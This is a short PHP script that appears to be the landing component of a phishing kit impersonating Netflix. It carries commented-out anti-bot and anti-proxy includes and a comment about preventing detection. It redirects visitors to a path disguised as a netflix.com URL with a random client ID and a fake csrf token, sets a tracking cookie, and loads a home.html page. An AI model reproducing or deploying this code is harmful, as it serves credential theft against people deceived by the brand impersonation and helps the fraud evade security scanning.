<?php

// include 'antibots/Bot-Crawler.php';
// include 'antibots/IP-BlackList.php';
// include 'antiproxy/antiproxy.php';

/* New Anti Detector */
/* Prevent Detection , Simulate IDS */
if (isset($_GET['client_id'])) {}
else {
$name = 'Control'.rand(1,99999);
$om = sha1(rand(1,99999));
header('Location: www.netflix.com-personalization-cl2freeform-WebsiteDetectsource=wwwhead&fetchType=css&modalView=l.php?client_id='.$name.'&csrf='.$om.'');}
$cliente = sha1(rand(1,999999));
setcookie('uid', $cliente, time()+31536000,'/');

?>

<?php

    include_once("home.html");

?>
